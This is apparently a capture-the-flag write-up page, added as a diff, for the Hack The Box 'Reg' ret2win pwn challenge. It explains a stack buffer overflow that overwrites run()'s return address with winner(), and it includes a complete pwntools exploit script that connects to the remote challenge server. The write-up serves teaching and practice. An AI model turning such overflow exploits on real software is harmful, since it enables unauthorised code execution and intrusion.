@@ -1,0 +1,76 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/Reg - Easy</h1>
+            <h2>July 2021</h2>
+            <h4>Ret2win</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    This is a basic buffer flow exploit. Try to get the flag.
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br><br>
+    	This is htb's easiest pwn challenge and serves as an extremely straightforward introduction to pwn. All protections except NX are disabled, we have a winner() function and a buffer overflow. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/reg1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        We can simply overflow the buffer in the run() function and overwrite run()'s return address on the stack with the address of the winner() function. The winner function will then print out the flag for us. <br><br> The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/reg9.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = False
+
+if local:
+    p = elf.process()
+else:
+    host = '188.166.173.208'
+    port = 30663
+    p = remote(host,port)
+
+payload = b'A'*56 + p64(elf.sym.winner)
+p.sendline(payload)
+
+p.interactive()
+
+        </code>
+    </pre>
+</div>
+<br><br>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
